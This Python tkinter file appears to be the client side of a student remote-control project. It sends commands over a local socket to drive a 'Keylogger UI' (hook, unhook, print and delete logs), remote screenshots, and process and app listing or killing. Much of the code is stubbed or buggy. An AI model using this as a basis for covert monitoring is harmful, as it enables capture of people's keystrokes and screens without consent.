import server
import tkinter as tk
from tkinter import messagebox,filedialog,scrolledtext
import socket
import os
import pygetwindow as gw
from PIL import ImageGrab
import subprocess
import psutil

from PIL import Image, ImageTk, ImageGrab

host = "127.0.0.1"
port = 65431
timeout = 3
client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
isConnected = False

def Quit():
    print("Program Close!")
    isConnected = False
    client_socket.close()
    root.quit()

def connect(user_input):
    global isConnected
    try:
        client_socket.settimeout(timeout)
        client_socket.connect((host, port))
        isConnected = True
        print("Connection successful.")
        messagebox.showinfo("Success", "Connection successful!")
    except socket.timeout:
        print("Connection timed out!")
        messagebox.showinfo("Error", "Connection timed out!")
    except (socket.timeout, ConnectionRefusedError, OSError) as e:
        print(f"Connection failed: {e}")
        messagebox.showinfo("Error", "Connection failed!")

def send_command(command):
    if (isConnected == False):
        messagebox.showinfo("Error", "Connection failed!")
        return
    client_socket.sendall(command.encode())
    print(command)
    parts = command.split()
    if parts[0] == "SendKeyStroke":
        Handle_send_keystroke()
    elif parts[0] == "TakeScreenShot":
        Handle_take_screenshot()
    elif parts[0] == "AppRunning":
        Handle_app_running_check()
    elif parts[0] == "ProcessRunning":
        Handle_process_running_check()
    elif parts[0] == "ShutDownComputer":
        Handle_shutdown_computer()
    elif parts[0] == "FixRegistry":
        Handle_fix_registry()

def submit_button_click(event=None):
    user_input = InputTextbox.get()
    print("User input:", user_input)
    connect(user_input)
    InputTextbox.delete(0, tk.END)

#####################################################################
# Send keystroke
def CreateUI_SendKeyStroke():
    def on_closing():
        command = "CLOSE"
        client_socket.sendall(command.encode())
        KeyStrokeRoot.destroy()
    def hook():
        command = "HOOK"
        client_socket.sendall(command.encode())
        # while True:
        #     data = client_socket.recv(1024).decode()
        #     text_area.insert(tk.END, data)
    def unhook():
        command = "UNHOOK"
        client_socket.sendall(command.encode())
    def print_logs():
        command = "PRINT"
        client_socket.sendall(command.encode())
        file_data = client_socket.recv(1024)
        log_content = file_data.decode('utf-8')
        text_area.delete(1.0, tk.END)
        text_area.insert(tk.END, log_content)
    def delete_logs():
        command = "DELETE"
        client_socket.sendall(command.encode())
        # response = client_socket.recv(1024)
        text_area.delete(1.0, tk.END)
        # print(response.decode())

    # Create the main window
    KeyStrokeRoot = tk.Tk()
    KeyStrokeRoot.title("Keylogger UI")
    KeyStrokeRoot.geometry("800x600")

    # Create buttons
    hook_button = tk.Button(KeyStrokeRoot, text="Hook", command=hook)
    unhook_button = tk.Button(KeyStrokeRoot, text="Unhook", command=unhook)
    print_button = tk.Button(KeyStrokeRoot, text="Print Logs", command=print_logs)
    delete_button = tk.Button(KeyStrokeRoot, text="Delete Logs", command=delete_logs)

    # Create a scrolled text area
    text_area = scrolledtext.ScrolledText(KeyStrokeRoot, width=70, height=20)
    KeyStrokeRoot.protocol("WM_DELETE_WINDOW", on_closing)
    # Place buttons and text area in the UI
    hook_button.pack(pady=10)
    unhook_button.pack(pady=10)
    print_button.pack(pady=10)
    delete_button.pack(pady=10)
    text_area.pack(pady=20)
    KeyStrokeRoot.mainloop()

def Handle_send_keystroke():    
    CreateUI_SendKeyStroke()

#####################################################################
# Screenshot

#1: Open the system's file manager for the user to input the file's name
def SaveImage(image_path):
    image = Image.open(image_path)
    file_path = filedialog.asksaveasfilename(defaultextension=".png", filetypes=[("PNG files", "*.png")])
    
    if file_path:
        image.save(file_path)
        print(f"Image saved to: {file_path}")
        try:
            os.remove(file_path)
        except OSError as e:
            print(f"Error deleting image: {e}")

#2: Used for updating the picture constantly
def TakePictureButtonFunction():
    command = "TakeScreenShot"
    client_socket.sendall(command.encode())
    ReceiveImage()

    new_image = Image.open("received_image.png")
    new_image = new_image.resize((600, 450), Image.LANCZOS)
    new_photo = ImageTk.PhotoImage(new_image, master=ScreenShotRoot)
    label.config(image=new_photo)
    label.image = new_photo

#3: Create a UI for this feature
def display_image(image_path):
    global ScreenShotRoot
    ScreenShotRoot = tk.Tk()
    ScreenShotRoot.title("Captured Image")
    ScreenShotRoot.geometry("800x600")
    ScreenShotRoot.resizable(False, False)

    image = Image.open(image_path)
    image = image.resize((600, 450), Image.LANCZOS)  # Resize the image using LANCZOS resampling
    photo = ImageTk.PhotoImage(image, master = ScreenShotRoot)
    global label
    label = tk.Label(ScreenShotRoot, image=photo)
    label.pack()

    take_picture_button = tk.Button(ScreenShotRoot, text="Take Picture", command=lambda: TakePictureButtonFunction())
    take_picture_button.pack()

    save_button = tk.Button(ScreenShotRoot, text="Save", command=lambda: SaveImage(image_path))
    save_button.pack()
    ScreenShotRoot.mainloop()

#4: Listen and receive image through TCP connection
def ReceiveImage(image_path="received_image.png"):
    file = open(image_path, "wb")
    isBreak = False
    while True:
        if (isBreak):
            break
        image_chunk = client_socket.recv(2048)
        if (len(image_chunk) < 2048):
            isBreak = True
        if (len(image_chunk) == 0):
            break
        file.write(image_chunk)
    file.close()
    print("picture received")

#5: main function for this task
def Handle_take_screenshot():
    ReceiveImage()
    display_image("received_image.png")

#####################################################################

def get_apps_in_taskbar():
    taskbar_apps = []

    windows = gw.getWindowsWithTitle('')
    for index, window in enumerate(windows):
        taskbar_apps.append((index, window.title))

    return taskbar_apps

def open_application(app_name):
    try:
        subprocess.Popen([app_name], shell=True)
    except FileNotFoundError:
        messagebox.showinfo("Failed", "Application '{app_name}' not found or could not be opened.")

def close_app_by_id(app_id):
    windows = gw.getWindowsWithTitle('')
    if app_id < len(windows):
        windows[app_id].close()
        messagebox.showinfo("Success", "Closed application with ID {app_id}")
    else:
        messagebox("Failed", "No application found with ID {app_id}")

def create_AppRunning_UI():
    def on_closing():
        command = "CLOSE"
        client_socket.sendall(command.encode())
        AppRunningRoot.destroy()
        
    def start():
        command = "START"
        client_socket.sendall(command.encode())
        app_name = input()
        open_application(app_name)
        
    def kill():
        command = "KILL"
        client_socket.sendall(command.encode())
        app_id = int(input())
        close_app_by_id(app_id)
        
    def show():
        command = "SHOW"
        client_socket.sendall(command.encode())
        taskbar_app = get_apps_in_taskbar()
        if taskbar_app:
            for app_id, app_title in taskbar_app:
                if len(app_title) > 0:
                    print(f"ID: {app_id}, Title: {app_title}")
                    
    def delete():
        command = "DELETE"
        client_socket.sendall(command.encode())

    # Create the main window
    AppRunningRoot = tk.Tk()
    AppRunningRoot.title("AppRunning UI")
    AppRunningRoot.geometry("800x600")

    # Create buttons
    start_button = tk.Button(AppRunningRoot, text="Start", command=start)
    kill_button = tk.Button(AppRunningRoot, text="Kill", command=kill)
    show_button = tk.Button(AppRunningRoot, text="Show", command=show)
    delete_button = tk.Button(AppRunningRoot, text="Delete", command=delete)

    AppRunningRoot.protocol("WM_DELETE_WINDOW", on_closing)
    # Place buttons and text area in the UI
    start_button.pack(pady=10)
    kill_button.pack(pady=10)
    show_button.pack(pady=10)
    delete_button.pack(pady=10)
    AppRunningRoot.mainloop()
    
# App running 
def Handle_app_running_check():
    create_AppRunning_UI()

#####################################################################
def terminate_processwithID(process_ID):
    isFlag = False
    for process in psutil.process_iter(attrs=['pid', 'name']):
        if process.info['pid'] == process_ID:
            try:
                isFlag = True
                psutil.Process(process.info['pid']).terminate()
            except psutil.NoSuchProcess:
                return f"Process {process_ID} not found"
            except psutil.AccessDenied:
                return f"Access denied to terminate {process_ID}"
    if isFlag == False:
        messagebox.showinfo('Failed', 'No proccess with that name.')
    else:
        messagebox.showinfo('Success', 'Process killed.')

def printProcess():
    for process in psutil.process_iter(attrs=['pid','name']):
        print(f"ID: {process.info['pid']}, Name: {process.info['name']}")

def open_process(process_name):
    try:
        subprocess.Popen([process_name], shell=True)
    except FileNotFoundError:
        messagebox.showinfo("Failed", "Application '{app_name}' not found or could not be opened.")

def create_ProcessRunning_UI():
    def on_closing():
        command = "CLOSE"
        client_socket.sendall(command.encode())
        ProcessRunningRoot.destroy()
        
    def start():
        command = "START"
        client_socket.sendall(command.encode())
        process_name = input()
        open_process(process_name)
        
    def kill():
        command = "KILL"
        client_socket.sendall(command.encode())
        process_id = int(input())
        terminate_processwithID(process_id)
        
    def show():
        command = "SHOW"
        client_socket.sendall(command.encode())
        printProcess()
                    
    def delete():
        command = "DELETE"
        client_socket.sendall(command.encode())

    # Create the main window
    ProcessRunningRoot = tk.Tk()
    ProcessRunningRoot.title("ProcessRunning UI")
    ProcessRunningRoot.geometry("800x600")

    # Create buttons
    start_button = tk.Button(ProcessRunningRoot, text="Start", command=start)
    kill_button = tk.Button(ProcessRunningRoot, text="Kill", command=kill)
    show_button = tk.Button(ProcessRunningRoot, text="Show", command=show)
    delete_button = tk.Button(ProcessRunningRoot, text="Delete", command=delete)

    ProcessRunningRoot.protocol("WM_DELETE_WINDOW", on_closing)
    # Place buttons and text area in the UI
    start_button.pack(pady=10)
    kill_button.pack(pady=10)
    show_button.pack(pady=10)
    delete_button.pack(pady=10)
    ProcessRunningRoot.mainloop()
#Process running
def Handle_process_running_check():
    create_ProcessRunning_UI()

#####################################################################
# Shutdown
def Handle_shutdown_computer():
    pass

#####################################################################
# Fix Registry
def Handle_fix_registry():
    pass

#####################################################################
# Building the Client UI
root = tk.Tk()
root.geometry("650x550")
root.resizable(False, False)

InputMessage = tk.StringVar()
InputMessage.set("")

InputTextbox = tk.Entry(root, width=50, textvariable=InputMessage)
InputTextbox.place(x=35, y=80)
InputTextbox.bind("<Return>", submit_button_click)

SubmitButton = tk.Button(root, text="Connect", width=10, command=submit_button_click)
SubmitButton.place(x=500, y = 75)

ProcessRunningButton = tk.Button(
    root,
    text="Process\nrunning",
    width=10,
    height=16,
    font=("Helvetica", 14, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=lambda: send_command("ProcessRunning"),
    highlightthickness=2,
)
ProcessRunningButton.place(x=35, y=120)

AppRunningButton = tk.Button(
    root,
    text="App running",
    width=20,
    height=4,
    font=("Helvetica", 14, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=lambda: send_command("AppRunning"),
    highlightthickness=2,
)
AppRunningButton.place(x=185, y=120)

KeyStrokeButton = tk.Button(
    root,
    text="Keystroke",
    width=12,
    height=11,
    font=("Helvetica", 14, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=lambda: send_command("SendKeyStroke"),
    highlightthickness=2,
)
KeyStrokeButton.place(x=450, y=120)

ShutDownButton = tk.Button(
    root,
    text="Shut down",
    width=8,
    height=5,
    font=("Helvetica", 15, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=lambda: send_command("ShutDownComputer"),
    highlightthickness=2,
)
ShutDownButton.place(x=185, y=241)

ScreenShotButton = tk.Button(
    root,
    text="ScreenShot",
    width=10,
    height=5,
    font=("Helvetica", 15, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=lambda: send_command("TakeScreenShot"),
    highlightthickness=2,
)
ScreenShotButton.place(x=304, y=241)

FixRegistryButton = tk.Button(
    root,
    text="Fixing Registry",
    width=26,
    height=3,
    font=("Helvetica", 15, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=lambda: send_command("FixRegistry"),
    highlightthickness=2,
)
FixRegistryButton.place(x=185, y=399)

QuitButton = tk.Button(
    root,
    text="Quit",
    width=6,
    height=3,
    font=("Helvetica", 15, "bold"),
    relief=tk.RAISED,
    bd=3,
    command=Quit,
    highlightthickness=2,
)
QuitButton.place(x=522, y=399)

if __name__ == "__main__":
    root.mainloop()
